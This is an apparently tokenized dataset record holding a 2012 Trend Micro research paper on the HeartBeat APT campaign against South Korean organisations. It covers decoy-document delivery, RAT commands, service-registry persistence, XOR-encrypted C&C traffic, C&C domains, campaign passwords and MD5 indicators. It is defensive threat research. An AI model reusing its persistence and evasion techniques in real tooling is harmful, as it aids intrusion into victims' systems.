"R33", "r": "P32", "h": 54, "t": 53, "evidence": [306, 307, 308, 309]}, {"old_id": "R34", "r": "P32", "h": 54, "t": 51, "evidence": [306, 307, 308]}, {"old_id": "R35", "r": "P32", "h": 54, "t": 52, "evidence": [306, 307, 308]}], "title": ["inputs/txt/201201TrendMicroHeartBeat"], "sents": [["Trend", "Micro", "Incorporated"], ["Research", "Paper"], ["2012"], ["The", "HeartBeat", "APT"], ["Campaign"], ["Roland", "Dela", "Paz"], ["Contents"], ["About", "This", "Paper", ".", "..................................................................................................................................", "1"], ["Introduction", ".", "...........................................................................................................................................", "1"], ["Campaign", "Targets", ".", "................................................................................................................................", "2"], ["Context", ".", "...................................................................................................................................................", "2"], ["Attack", "Vector", ".", "........................................................................................................................................", "3"], ["Infection", "Flow", ".", ".......................................................................................................................................4"], ["The", "RAT", "Component", ".", "...........................................................................................................................", "5"], ["Backdoor", "Functionalities", ".", "............................................................................................................", "5"], ["Installation", "and", "Persistence", ".", ".......................................................................................................", "5"], ["C&C", "Communication", ".", "....................................................................................................................", "6"], ["Command", "and", "Control", ".", "........................................................................................................................8"], ["HeartBeat", "Campaign", "Codes", "and", "Decoy", "Documents", ".", "...................................................................8"], ["Relationships", "among", "C&C", "Domains", ",", "IPs", ",", "and", "Campaigns", ".", "..........................................................", "9"], ["Attribution", ".", "............................................................................................................................................10"], ["Conclusion", ".", "............................................................................................................................................10"], ["Timeline", ".", ".................................................................................................................................................10"], ["Defending", "against", "the", "HeartBeat", "Campaign", ".", "................................................................................11"], ["Trend", "Micro", "Threat", "Protection", "Against", "The", "HeartBeat", "Campaign", "Components", ".", "................12"], ["PAGE", "ii", "|", "THE", "HEARTBEAT", "APT", "CAMPAIGN"], ["About", "This", "Paper"], ["Introduction"], ["This", "paper", "exposes", "a", "targeted", "attack", "called", "\u201cHeartBeat", ",", "\u201d"], ["which", "has", "been", "persistently", "pursuing", "the", "South", "Korean"], ["government", "and", "related", "organizations", "since", "2009", ".", "This"], ["paper", "will", "discuss", "how", "their", "specifically", "crafted", "campaigns"], ["infiltrate", "their", "targets", "."], ["Today\u2019s", "cybercriminals", "try", "to", "infect", "as", "many", "users", "as"], ["possible", ".", "Their", "goal", "is", "simple\u2014to", "monetize", "the", "resources", "or"], ["data", "from", "infected", "machines", "in", "any", "way", "they", "can", ".", "Behind"], ["such", "attacks", "are", "highly", "covert", "targeted", "campaigns", "known"], ["as", "APTs", "."], ["Compared", "to", "most", "advanced", "persistent", "threat", "(APT)"], ["campaigns", "with", "diverse", "targeted", "industries", ",", "the", "HeartBeat"], ["campaign", "is", "an", "isolated", "case", ".", "Furthermore", ",", "we", "will", "examine"], ["their", "attack", "methodologies", "which", "include", "their", "attack"], ["vector", ",", "the", "remote", "administration", "tool", "(RAT)", "component", ","], ["and", "command-and-control", "servers", ".", "Finally", ",", "we", "will", "discuss"], ["how", "this", "information", "can", "be", "useful", "in", "developing", "defensive"], ["strategies", "in", "protecting", "organizations", "as", "well", "as", "predicting"], ["future", "targets", "."], ["While", "targeted", "campaigns", "continue", "to", "increase", ",", "research"], ["efforts", "by", "the", "security", "industry", "reveal", "that", "some", "of", "these"], ["attacks", "have", "existed", "for", "several", "years", ".", "1", "Depending", "on", "the"], ["motive", ",", "APT", "campaigns", "may", "attack", "various", "industries", ","], ["organizations", "or", "communities", "from", "different", "regions", "and"], ["countries", ".", "For", "instance", ",", "the", "Luckycat", "campaign", "targeted"], ["the", "aerospace", ",", "energy", ",", "engineering", ",", "shipping", ",", "and", "military"], ["research", "industries", "in", "India", "and", "Japan", ".", "2", "Additionally", ","], ["they", "targeted", "the", "Tibetan", "activists\u2019", "community", ".", "The"], ["IXESHE", "campaign", ",", "on", "the", "other", "hand", ",", "targeted", "East", "Asian"], ["governments", ",", "Taiwanese", "electronics", "manufacturers", ","], ["and", "a", "telecommunications", "company", ".", "3", "While", "most", "of"], ["these", "campaigns", "have", "multiple", "targets", ",", "smaller", ",", "more"], ["subtle", "campaigns", "with", "exceedingly", "specific", "targets", "are"], ["also", "present", ".", "The", "Taidoor", "campaign", "is", "an", "example", "of"], ["this", ",", "where", "all", "of", "the", "compromise", "victims", "were", "from"], ["Taiwan", ",", "and", "the", "majority", "of", "which", "were", "government"], ["organizations", ".", "4"], ["This", "research", "paper", "will", "delve", "into", "a", "targeted", "campaign"], ["that", "targets", "organizations", "and", "communities", "within", "South"], ["Korea", ".", "We", "call", "this", "malicious", "operation", "the", "\u201cHeartBeat"], ["campaign", ".", "\u201d"], ["1"], ["http://www", ".", "trendmicro.com/cloud-content/us/pdfs/securityintelligence/white-papers/wp_dissecting-lurid-apt.pdf"], ["2", "http://www", ".", "trendmicro.com/cloud-content/us/pdfs/securityintelligence/white-papers/wp_luckycat_redux.pdf"], ["3", "http://www", ".", "trendmicro.com/cloud-content/us/pdfs/securityintelligence/white-papers/wp_ixeshe.pdf"], ["4", "http://www", ".", "trendmicro.com/cloud-content/us/pdfs/securityintelligence/white-papers/wp_the_taidoor_campaign.pdf"], ["PAGE", "1", "|", "THE", "HEARTBEAT", "APT", "CAMPAIGN"], ["Campaign", "Targets"], ["Context"], ["The", "HeartBeat", "campaign", "appears", "to", "target", "government"], ["organizations", "and", "institutions", "or", "communities", "that", "are"], ["in", "some", "way", "related", "to", "the", "South", "Korean", "government", "."], ["Specifically", ",", "we", "were", "able", "to", "identify", "the", "following", "targets:"], ["The", "first", "HeartBeat", "campaign", "remote", "access", "tool", "(RAT)5"], ["component", "was", "discovered", "in", "June", "2012", "in", "a", "Korean"], ["newspaper", "company", "network", ".", "Further", "investigation"], ["revealed", "that", "the", "campaign", "has", "been", "actively", "distributing"], ["their", "RAT", "component", "to", "their", "targets", "in", "2011", "and", "the", "first"], ["half", "of", "2012", ".", "Furthermore", ",", "we", "uncovered", "one", "malware"], ["component", "that", "dates", "back", "to", "November", "2009", ".", "This"], ["indicates", "that", "the", "campaign", "started", "during", "that", "time", "or"], ["earlier", "."], ["\u2022", "Political", "parties"], ["\u2022", "Media", "outfits"], ["\u2022", "A", "national", "policy", "research", "institute"], ["\u2022", "A", "military", "branch", "of", "South", "Korean", "armed", "forces"], ["Earlier", "versions", "of", "the", "HeartBeat", "campaign\u2019s", "RAT"], ["component", "contained", "the", "following", "strings", "in", "their", "codes:"], ["\u2022", "A", "small", "business", "sector", "organization"], ["Thus", ",", "the", "campaign", "name", "\u201cHeartBeat", ".", "\u201d"], ["\u2022", "Branches", "of", "South", "Korean", "government"], ["The", "profile", "of", "their", "targets", "suggests", "that", "the", "motive"], ["behind", "the", "campaign", "may", "be", "politically", "motivated", "."], ["Figure", "1", ".", "Code", "used", "in", "the", "HeartBeat", "campaign\u2019s", "RAT", "component"], ["5", "http://en", ".", "wikipedia.org/wiki/Remote_administration_software"], ["PAGE", "2", "|", "THE", "HEARTBEAT", "APT", "CAMPAIGN"], ["Attack", "Vector"], ["In", "order", "to", "gain", "control", "over", "targets", "systems", ",", "HeartBeat"], ["perpetrators", "install", "a", "RAT", "in", "prospective", "victims\u2019", "systems", "."], ["This", "RAT", "arrives", "as", "a", "disguised", "or", "fake", "document", "which"], ["is", "actually", "a", "bundled", "file", ".", "The", "bundled", "file", "contains", "both"], ["a", "decoy", "document", "and", "the", "RAT", "installer", "that", "has", "been"], ["packaged", "together", "using", "a", "binder", "tool", ".", "Once", "it", "runs", ",", "the"], ["decoy", "document", "is", "displayed", "to", "the", "user", "while", "the", "RAT"], ["unknowingly", "executes", "in", "the", "background", "."], ["Based", "on", "the", "samples", "we", "collected", ",", "the", "campaign\u2019s", "decoy"], ["documents", "used", "the", "file", "formats", "", ".", "JPG,", "", ".", "PDF,", "XLS", ",", "and", "HWP", ","], ["the", "Korean", "government", "standard", "word", "processor", "format", "."], ["One", "of", "the", "previous", "HeartBeat", "attacks", "even", "dropped", "a"], ["pornographic", "", ".", "JPG", "image", "as", "decoy", ".", "Below", "is", "a", "screenshot"], ["of", "a", "Hangul", "Word", "Processor", "(", ".", "HWP)", "document", "used", "as", "bait"], ["in", "November", "2011", ".", "Its", "document", "title", "roughly", "translates", "to"], ["\u201cInformation", "to", "the", "President", ".", "hwp.\u201d"], ["It", "is", "unclear", "how", "these", "packaged", "files", "specifically", "arrive", "on"], ["victims\u2019", "systems", ",", "but", "we", "highly", "suspect", "that", "spearphishing"], ["emails6", "containing", "these", "packaged", "malware", "were", "primarily"], ["used", "to", "distribute", "them", ".", "In", "fact", ",", "the", "packaged", "malware"], ["used", "the", "icon", "of", "the", "decoy", "document", "in", "order", "to", "look"], ["legitimate", ".", "For", "instance", ",", "if", "the", "decoy", "is", "an", "XLS", "file", ",", "the"], ["package", "will", "appear", "to", "have", "an", "XLS", "document", "icon", ".", "In"], ["addition", ",", "some", "of", "the", "decoy", "files", "required", "passwords", "in"], ["order", "to", "be", "viewed", "."], ["Figure", "3", ".", "A", "decoy", "", ".", "HWP", "document"], ["Figure", "2", ".", "Example", "of", "a", "decoy", "Adobe", "Reader", "document"], ["The", "previously", "mentioned", "techniques", "are", "commonly", "used"], ["in", "spearphishing", "attacks", "where", "prospective", "victims", "are"], ["lured", "to", "open", "a", "seemingly", "benign", "document", "attachment", "."], ["In", "order", "to", "appear", "more", "legitimate", ",", "some", "of", "these", "emails"], ["contain", "password", "protected", "documents", ".", "A", "password", "is"], ["then", "provided", "in", "the", "email", "body", "as", "a", "social", "engineering"], ["technique", "."], ["6", "http://blog", ".", "trendmicro.com/taiwan-spear-phishers-target-gmail-users/"], ["PAGE", "3", "|", "THE", "HEARTBEAT", "APT", "CAMPAIGN"], ["Infection", "Flow"], ["Once", "users", "open", "the", "packaged", "malicious", "file", ",", "the", "actual", "document", "is", "displayed", "to", "the", "user", "while", "a", "RAT", "installer", "in"], ["", ".", "EXE", "format", "runs", "in", "the", "background", ".", "The", "RAT", "installer", ",", "on", "the", "other", "hand", ",", "drops", "a", "", ".", "DLL", "file", "that", "is", "then", "injected", "to", "the"], ["legitimate", "process", "svchost", ".", "exe.", "The", "injected", "code", "in", "svchost", ".", "exe", "then", "connects", "to", "the", "malware", "command", "and", "control"], ["(C&C)", "server", "to", "register", "infection", "and", "wait", "for", "remote", "commands", "."], ["Figure", "4", ".", "Infection", "diagram", "for", "the", "HeartBeat", "campaign"], ["TREND", "MICRO", "INCORPORATED"], ["TREND", "MICRO", "INC", "."], ["Trend", "Micro", "Incorporated", "(TYO:", "4704;", "TSE:", "4704)", ",", "a", "global", "cloud", "security"], ["leader", ",", "creates", "a", "world", "safe", "for", "exchanging", "digital", "information", "with", "its", "Internet", "content", "security", "and", "threat", "management", "solutions", "for", "businesses"], ["and", "consumers", ".", "A", "pioneer", "in", "server", "security", "with", "over"], ["20", "years\u2019", "experience", ",", "we", "deliver", "top-ranked", "client", ",", "server", "and", "cloudbased", "security", "that", "fits", "our", "customers\u2019", "and", "partners\u2019", "needs", ",", "stops"], ["new", "threats", "faster", ",", "and", "protects", "data", "in", "physical", ",", "virtualized", "and", "cloud"], ["environments", ".", "Powered", "by", "the", "industry-leading", "Trend", "Micro\u2122", "Smart", "Protection", "Network\u2122", "cloud", "computing", "security", "infrastructure", ",", "our", "products"], ["and", "services", "stop", "threats", "where", "they", "emerge\u2014from", "the", "Internet", ".", "They", "are"], ["supported", "by", "1", ",", "000+", "threat", "intelligence", "experts", "around", "the", "globe", "."], ["10101", "N", ".", "De", "Anza", "Blvd", "."], ["Cupertino", ",", "CA", "95014"], ["U", ".", "S.", "toll", "free:", "1", "+800", ".", "228.5651"], ["Phone:", "1", "+408", ".", "257.1500"], ["Fax:", "1", "+408", ".", "257.2003"], ["www", ".", "trendmicro.com"], ["\u00a92012", "by", "Trend", "Micro", ",", "Incorporated", ".", "All", "rights", "reserved", ".", "Trend", "Micro", "and", "the", "Trend", "Micro", "t-ball", "logo", "are", "trademarks", "or", "registered", "trademarks", "of", "Trend", "Micro", ",", "Incorporated", ".", "All", "other", "product", "or", "company"], ["names", "may", "be", "trademarks", "or", "registered", "trademarks", "of", "their", "owners", "."], ["PAGE", "4", "|", "THE", "HEARTBEAT", "APT", "CAMPAIGN"], ["The", "RAT", "Component"], ["Backdoor", "Functionalities"], ["The", "HeartBeat", "campaign\u2019s", "RAT", "component", "allows"], ["attackers", "to", "remotely", "execute", "the", "following", "commands", "on"], ["affected", "hosts:"], ["\u2022", "List", "running", "processes", "and", "their", "respective", "process"], ["IDs"], ["\u2022", "Download", "and", "execute", "file(s)"], ["\u2022", "Update", "itself"], ["\u2022", "Uninstall", "itself"], ["\u2022", "Create", "or", "terminate", "a", "process"], ["\u2022", "List", "available", "removable", "and", "fixed", "drives"], ["The", "RAT", "installer", "in", "turn", "drops", "a", "", ".", "DLL", "component", "which"], ["contains", "the", "backdoor", "capabilities", ".", "In", "order", "to", "stay", "hidden", ","], ["the", "", ".", "DLL", "uses", "file", "names", "similar", "to", "legitimate", "applications", "."], ["Below", "is", "a", "list", "of", "file", "names", "used:"], ["\u2022", "%Program", "Files%\\Common", "Files\\Services\\6to4nt", ".", "dll"], ["\u2022", "%Program", "Files%\\Common", "Files\\System\\6to4nt", ".", "dll"], ["\u2022", "%Program", "Files%\\Windows", "NT\\Accessories\\6to4nt", ".", "dll"], ["\u2022", "%Program", "Files%\\Windows", "NT\\htrn", ".", "dll"], ["\u2022", "%Program", "Files%\\Windows", "NT\\htrn_jls", ".", "dll"], ["\u2022", "%Program", "Files%\\Windows", "NT\\hyper", ".", "dll"], ["\u2022", "%System%\\Network", "Remote", ".", "dll"], ["\u2022", "%System%\\SvcHost", ".", "dll"], ["Some", "these", "dropped", "", ".", "DLL", "files", "use", "fake", "file", "properties"], ["in", "order", "to", "not", "appear", "suspicious", ".", "The", "following", "is", "an"], ["example:"], ["\u2022", "List", "existing", "files", "and", "their", "creation", "date/time"], ["\u2022", "Upload", "file(s)"], ["\u2022", "Delete", "file(s)"], ["\u2022", "Get", "the", "file", "creation", "date/time", "of", "a", "specific", "file"], ["\u2022", "Open", "a", "remote", "command", "shell", "access"], ["\u2022", "Reboot", "the", "system"], ["These", "commands", "give", "the", "attackers", "complete", "control", "over"], ["their", "victims\u2019", "systems", ".", "Attackers", "also", "have", "the", "option", "to"], ["uninstall", "the", "RAT", "any", "time", "to", "cover", "their", "tracks", "and", "avoid"], ["being", "discovered", "."], ["Installation", "and", "Persistence"], ["The", "RAT", "installer", "is", "initially", "dropped", "and", "executed", "by", "the"], ["packaged", "file", "using", "any", "of", "the", "following", "file", "names:"], ["\u2022", "%System%\\msrt", ".", "exe"], ["\u2022", "%Program", "Files%\\Common", "Files\\AcroRd32", ".", "exe"], ["\u2022", "%Program", "Files%\\Common", "Files\\config", ".", "exe"], ["Figure", "5", ".", "A", ".", "DLL", "that", "uses", "fake", "file", "properties"], ["\u2022", "%Program", "Files%\\Common", "Files\\explorer", ".", "exe"], ["PAGE", "5", "|", "THE", "HEARTBEAT", "APT", "CAMPAIGN"], ["In", "some", "cases", ",", "the", "RAT", "installer", "drops", "2", "", ".", "DLL", "files", "where"], ["one", "of", "the", "", ".", "DLLs", "serves", "as", "a", "loader", "of", "the", "other", "", ".", "DLL", "file"], ["which", "contains", "the", "backdoor", "payload", "."], ["The", "", ".", "DLL", "component", "is", "then", "registered", "as", "a", "service"], ["through", "the", "following", "added", "registries:"], ["HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\"], ["Services\\{service", "name}"], ["Type", "=", "\u201c20\u201d"], ["Start", "=", "\u201c2\u201d"], ["ErrorControl", "=", "\u201c1\u201d"], ["ImagePath", "=", "\u201c%SystemRoot%\\System32\\svchost", ".", "exe"], ["-k", "netsvcs\u201d"], ["ObjectName", "=", "\u201cLocalSystem\u201d"], ["HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\"], ["Services\\{service", "name}\\Parameters"], ["ServiceDll", "=", "C:\\Program", "Files\\Windows", "NT\\htrn", "."], ["dll"], ["HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\"], ["Services\\{service", "name}\\Security"], ["Security", "=", "{values}"], ["HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\"], ["Services\\{service", "name}\\Enum"], ["0", "=", "\u201cRoot\\LEGACY_{service", "name}\\0000\u201d"], ["Count", "=", "\u201c1\u201d"], ["NextInstance", "=", "\u201c1\u201d"], ["*{service", "name}", "may", "be", "\u201c6to4\u201d", ",", "\u201cIas\u201d", "or"], ["\u201cIrmon\u201d", "."], ["C&C", "Communication"], ["Once", "the", "RAT\u2019s", "", ".", "DLL", "component", "has", "been", "injected", "to"], ["svchost", ".", "exe,", "the", "malware", "attempts", "to", "register", "itself", "to", "the"], ["C&C", "server", "by", "sending", "the", "following", "information", "from", "the"], ["affected", "system:"], ["\u2022", "Computer", "name"], ["\u2022", "Local", "IP", "address"], ["\u2022", "Service", "pack"], ["These", "data", "are", "sent", "along", "with", "a", "campaign", "code", "and", "the"], ["string", "\u201cqawsed\u201d", ".", "While", "the", "\u201cqawsed\u201d", "string", "is", "not", "present"], ["in", "earlier", "versions", "of", "their", "RAT", ",", "we", "suspect", "that", "the"], ["attackers", "only", "recently", "added", "this", "as", "a", "default", "campaign"], ["password", "."], ["The", "RAT\u2019s", "C&C", "communication", "is", "encrypted", "with", "XOR"], ["encryption", "using", "a", "single", "byte", "key", ",", "02H", ".", "Furthermore", ",", "the"], ["data", "being", "transferred", "and", "received", "by", "the", "RAT", "C&C", "are"], ["800H", "(2", ",", "048", "bytes)", "in", "size", "."], ["The", "service", "is", "then", "invoked", "once", "installed", ".", "This", "results"], ["in", "the", "", ".", "DLL", "being", "injected", "to", "svchost", ".", "exe", "process", ".", "This"], ["registry", "modification", "allows", "the", "RAT", "to", "execute", "upon", "every"], ["system", "startup", "."], ["After", "installation", "the", "RAT", "installer", "deletes", "itself", ",", "which"], ["leaves", "only", "the", "disguised", "", ".", "DLL", "and", "related", "registry", "entries"], ["on", "the", "affected", "system", "."], ["Note", "that", "the", "presence", "of", "any", "of", "the", "files", "or", "registries"], ["above", "may", "be", "an", "indication", "of", "a", "possible", "HeartBeat"], ["infection", "in", "a", "system", "."], ["Figure", "6", ".", "RAT\u2019s", "encryption", "algorithm", "before", "sending", "data", "to", "its"], ["C&C", "server"], ["PAGE", "6", "|", "THE", "HEARTBEAT", "APT", "CAMPAIGN"], ["Figure", "7", ".", "RAT\u2019s", "decryption", "code", "upon", "receiving", "data", "from", "the", "C&C", "server"], ["During", "the", "RAT\u2019s", "phone", "home", ",", "the", "following", "TCP", "traffic", "is", "observed", "on", "the", "network:"], ["When", "decrypted", ",", "the", "above", "traffic", "looks", "as", "follows:"], ["The", "majority", "of", "the", "RAT", "variants", "used", "port", "80", ".", "Recent"], ["variants", ",", "however", ",", "were", "observed", "to", "use", "port", "443", ".", "Other"], ["ports", "we", "have", "seen", "being", "utilized", "are", "port", "5600", "and", "port"], ["8080", "."], ["Earlier", "RAT", "variants", "did", "not", "use", "encryption", "on", "their", "C&C"], ["communication", ".", "Moreover", ",", "they", "only", "sent", "the", "computer"], ["name", "and", "campaign", "code", "during", "phone", "home", ".", "Below", "is", "a"], ["screenshot", "of", "the", "unencrypted", "C&C", "communication", "."], ["PAGE", "7", "|", "THE", "HEARTBEAT", "APT", "CAMPAIGN"], ["The", "C&C", "traffic", "size", "also", "varied", "in", "previous", "versions", ".", "Some"], ["early", "variants", "used", "traffic", "that", "are", "28H", "(40", "bytes)", "and"], ["1004H", "(4", ",", "100", "bytes)", "in", "size", "."], ["Additionally", ",", "the", "port", ",", "C&C", "address", ",", "campaign", "code", "and"], ["password", "are", "hardcoded", "in", "the", "RAT\u2019s", "malware", "body"], ["in", "plain", "text", ".", "In", "some", "RAT", "versions", ",", "however", ",", "they", "are"], ["encrypted", "and", "are", "decrypted", "only", "during", "run-time", ","], ["possibly", "to", "protect", "the", "RAT", "from", "static", "analysis", "by", "security"], ["researchers", "."], ["These", "variations", "in", "their", "RAT", "component", "indicate", "that", "it"], ["has", "since", "been", "undergoing", "development", "."], ["Command", "and", "Control"], ["HeartBeat", "Campaign", "Codes", "and", "Decoy"], ["Documents"], ["The", "campaign", "codes", "and", "decoy", "documents", "used", "by", "the"], ["HeartBeat", "attackers", "provided", "valuable", "insights", "on", "their"], ["campaigns", ".", "In", "fact", ",", "majority", "of", "their", "campaign", "codes"], ["included", "number", "combinations", "which", "represented", "the"], ["month", "and", "date", "in", "MMDD", "format", "when", "the", "attack", "attempt"], ["was", "executed", ".", "The", "rest", "of", "the", "campaign", "code", "string"], ["often", "describes", "the", "decoy", "document", "that", "was", "used", "in", "a"], ["specific", "campaign", ".", "For", "instance", ",", "a", "campaign", "code", "from"], ["October", "2011", "is", "\u201carmy-1022\u201d", "where", "attackers", "used", "a", "decoy"], ["document", "containing", "military-related", "information", "."], ["Campaign", "code"], ["The", "HeartBeat", "campaign\u2019s", "C&C", "domains", "appear", "to", "utilize"], ["a", "site", "redirection", "service", ".", "Their", "C&C", "sites", "redirect", "to", "IP"], ["addresses", "from", "ISPs", "in", "Armenia", ",", "USA", ",", "Japan", ",", "India", "and"], ["Korea", ".", "We", "observed", "that", "they", "updated", "the", "IP", "address"], ["of", "some", "of", "their", "C&C", "domains", ".", "Likewise", ",", "all", "of", "their", "IP"], ["addresses", "belong", "to", "legitimate", "ISPs", ".", "Considering", "this", ","], ["we", "suspect", "that", "these", "IP", "addresses", "are", "compromised"], ["hosts", "that", "act", "as", "proxy", "servers", "which", "redirects", "traffic", "to"], ["the", "actual", "C&C", "servers", ".", "Again", ",", "this", "adds", "another", "layer", "of"], ["anonymity", "to", "the", "HeartBeat", "perpetrators", "."], ["Domain"], ["IP", "Address"], ["ahnlab", ".", "myfw.us"], ["XXX", ".", "XXX.217.123", "/XXX", ".", "XX.121.84"], ["kissyou01", ".", "myfw.us"], ["XX", ".", "XXX.203.122", "/", "XX", ".", "XXX.20.103"], ["kita", ".", "myfw.us"], ["XXX", ".", "XXX.217.123", "/", "XXX", ".", "XX.121.84"], ["login", ".", "sbs.com.PassAs.us"], ["XXX", ".", "XXX.178.50"], ["mail2", ".", "myfw.us"], ["XX", ".", "XXX.15.63", "/", "XXX", ".", "XXX.198.93"], ["park007", ".", "myfw.us"], ["unknown"], ["snrp", ".", "UglyAs.com"], ["XXX", ".", "XXX.169.45"], ["www", ".", "banking.com.PassAs.us"], ["XXX", ".", "XXX.178.50"], ["www", ".", "huyang.go.kr.PassAs.us"], ["XXX", ".", "XXX.217.123", "/", "XX", ".", "XXX.136.115"], ["www", ".", "kinu.or.kr.rr.nu"], ["XXX", ".", "XXX.178.50"], ["www", ".", "kndu.ac.kr.myfw.us"], ["XXX", ".", "XXX.4.180"], ["young03", ".", "myfw.us"], ["XX", ".", "XXX.203.122"], ["Table", "1", ".", "List", "of", "HeartBeat", "C&Cs"], ["PAGE", "8", "|", "THE", "HEARTBEAT", "APT", "CAMPAIGN"], ["Password"], ["1119HWP"], ["None"], ["kris0315"], ["None"], ["PDF-0417"], ["None"], ["gh-0525"], ["None"], ["0909-jpg"], ["qawsed"], ["0916"], ["qawsed"], ["jpg-jf-0925"], ["qawsed"], ["army-1022"], ["qawsed"], ["1103-ghui"], ["qawsed"], ["1113-minzhu"], ["qawsed"], ["ajh7884@han"], ["qawsed"], ["001"], ["qawsed"], ["0305-ziyoudang"], ["qawsed"], ["0326-xuehui"], ["qawsed"], ["0328-junf"], ["qawsed"], ["0329-mnd"], ["qawsed"], ["1q2w3e4r"], ["None"], ["0520-tiegang"], ["qawsed"], ["guohui-0604"], ["qawsed"], ["Table", "2", ".", "Campaign", "codes", "used"], ["On", "the", "other", "hand", ",", "decoy", "documents\u2019", "contents", "were"], ["also", "very", "specific", "to", "their", "targets", ".", "For", "example", ",", "some", "of"], ["these", "documents", "included", "logos", "of", "specific", "groups", ".", "This"], ["information", "helped", "us", "identify", "their", "targeted", "organizations"], ["and", "communities", "in", "their", "previous", "campaigns", "."], ["PAGE", "9", "|", "THE", "HEARTBEAT", "APT", "CAMPAIGN"], ["Figure", "7", ".", "Relationships", "between", "HeartBeat", "attack", "components"], ["Relationships", "among", "C&C", "Domains", ",", "IPs", ",", "and", "Campaigns"], ["Attribution"], ["Clues", "relating", "to", "the", "attackers", "remain", "very", "limited", ".", "Using"], ["compromised", "hosts", "as", "C&C", "proxy", "servers", "minimizes", "the"], ["possibility", "of", "tracking", "potential", "threat", "actors", ".", "While", "a"], ["number", "of", "their", "campaign", "codes", "included", "Chinese", "words"], ["such", "as", "guohui", ",", "xuehui", "and", "minzhu", ",", "they", "appear", "to", "be"], ["comfortable", "using", "the", "English", "language", ".", "Some", "of", "the", "C&C"], ["domain", "names", "even", "contained", "English", "words", ".", "In", "addition", ","], ["the", "binder", "tool", "and", "the", "RAT", "component", "are", "written"], ["in", "English", ".", "For", "instance", ",", "some", "text", "from", "the", "packaged"], ["components\u2019", "body", "included", "\u201cSelect", "Files", "!", "\u201d", "and", "\u201cBind"], ["Success!\u201d", ",", "while", "the", "RAT", "component", "included", "strings"], ["such", "as", "\u201cUninstall\u2026ok\u201d", "and", "the", "name", "of", "the", "RAT", "itself", ","], ["\u201cHeartBeat", ".", "\u201d"], ["Threat", "actors", "and", "entities", "that", "use", "collected", "information"], ["from", "targets", "may", "be", "two", "separate", "parties", "that", "are", "only"], ["related", "in", "a", "professional", "and", "malicious", "manner", ".", "In", "this"], ["case", ",", "determining", "the", "latter", "may", "be", "impossible", ".", "Likewise", ","], ["it", "is", "very", "difficult", "to", "identify", "the", "threat", "actors", "behind"], ["the", "HeartBeat", "campaign", "given", "the", "limited", "amount", "of"], ["information", "available", "."], ["Conclusion"], ["The", "Heartbeat", "campaign", "has", "been", "successfully", "executing"], ["targeted", "attacks", "since", "2009", ".", "In", "order", "for", "attackers", "to"], ["properly", "track", "their", "campaigns", "and", "victims", ",", "they", "used"], ["campaign", "codes", "that", "contained", "the", "campaign", "dates", "and"], ["strings", "that", "described", "specific", "campaigns", ".", "These", "campaign"], ["codes", "are", "embedded", "in", "their", "RAT", "binaries", "and", "were", "sent"], ["to", "their", "C&C", "servers", "along", "with", "information", "regarding", "the"], ["targets\u2019", "system", ".", "Additionally", ",", "they", "used", "a", "commercial", "site"], ["redirection", "service", "for", "their", "C&C", "domains", ".", "These", "domains"], ["redirected", "to", "various", "IP", "addresses", "that", "belonged", "to"], ["legitimate", "ISPs", ",", "which", "may", "be", "compromised", "hosts", "that", "act"], ["as", "proxy", "servers", ".", "This", "effectively", "hides", "the", "real", "location", "of"], ["the", "attackers", "behind", "HeartBeat", ".", "While", "having", "an", "isolated"], ["target", "may", "have", "helped", "them", "stay", "under", "the", "security"], ["industry\u2019s", "radar", ",", "the", "attackers", "illustrated", "that", "they", "were"], ["very", "careful", "but", "persistent", "."], ["Understanding", "targeted", "campaigns", "and", "their"], ["methodologies", "is", "fundamental", "in", "protecting", "both", "end"], ["users", "and", "organizations", ".", "Not", "only", "does", "it", "help", "in", "coming"], ["up", "with", "effective", "defensive", "strategies", "through", "multiple"], ["protection", "layers", ",", "it", "also", "helps", "with", "predicting", "possible"], ["targets", "in", "the", "future", "and", "ultimately", ",", "raise", "awareness", ".", "As"], ["of", "this", "writing", ",", "the", "HeartBeat", "APT", "campaign", "remains", "an"], ["active", "targeted", "campaign", "."], ["Timeline"], ["We", "collected", "19", "set", "of", "samples", "related", "to", "HeartBeat"], ["campaign", "from", "November", "2009", "to", "June", "2012", ".", "This"], ["translates", "to", "19", "campaigns", "where", "the", "vast", "majority"], ["of", "which", "were", "distributed", "between", "2011", "and", "2012", "."], ["Nonetheless", ",", "the", "limited", "number", "of", "samples", "we", "were"], ["able", "to", "obtain", "still", "means", "that", "the", "campaign", "is", "indeed"], ["persistent", ".", "The", "isolated", "nature", "of", "this", "targeted", "attack"], ["and", "its", "small", "user", "base", "may", "only", "require", "the", "HeartBeat"], ["perpetrators", "to", "carry", "out", "minimal", "campaigns", "in", "order", "to"], ["infiltrate", "their", "targets", "."], ["Campaign"], ["Date"], ["(MM/DD/YY)"], ["MD5", "(", ".", "DLL", "component)"], ["Compile"], ["Date"], ["(MM/DD/YY)"], ["11/19/09"], ["7c6b44d8d87898e7e5deeeb1961b5ae6"], ["9/17/2009"], ["03/15/11"], ["fcf42cadb3a932989c8e2b29cef68861"], ["12/24/2010"], ["04/17/11"], ["aab129ffd3bf5ceeae2e0f332217bebc"], ["3/18/2011"], ["05/25/11"], ["86547d674e7c7da55e8cae359819832f"], ["5/6/2011"], ["09/09/111"], ["f947e63b14853a69b8ed2648869b5e10"], ["7/25/2011"], ["09/16/11"], ["7f1a633384ec97fae9d95d1df9e1135a"], ["7/25/2011"], ["09/25/11"], ["8816c5be1305488019769c81259dad2a"], ["9/21/2011"], ["10/22/11"], ["874025a66c2b9d9831c03d1bc114876a"], ["10/17/2011"], ["11/03/11"], ["4046dec1aa0eebb01fe7469184a95398"], ["10/31/2011"], ["11/13/11"], ["ba370b17dc9eb1d1e1c3187f0768064f"], ["10/31/2011"], ["12/2011"], ["51274cefb01cee981a09db83c984213d"], ["11/28/2011"], ["02/2012"], ["d1a2253361045f91ed1902e9ffe2cec3"], ["7/18/2011"], ["03/05/12"], ["20bb652e1d2679ed230102aa9676eca0"], ["3/1/2012"], ["03/26/12"], ["c5c0fea23138cddab96fe22b657f9132"], ["3/8/2012"], ["03/28/12"], ["ef2bc66ea69327d11d1859af26f5aef9"], ["3/8/2012"], ["03/29/12"], ["8e50af054d2c0b45c88082d53c4fc423"], ["3/8/2012"], ["04/2012"], ["b1e47ecd68c1c151866cec275716aa67"], ["4/18/2012"], ["05/20/12"], ["6d205e78fb7730066c116b0c2dffa398"], ["5/2/2012"], ["06/04/12"], ["5ec175512ba3c6e78597af48bbe6ca60"], 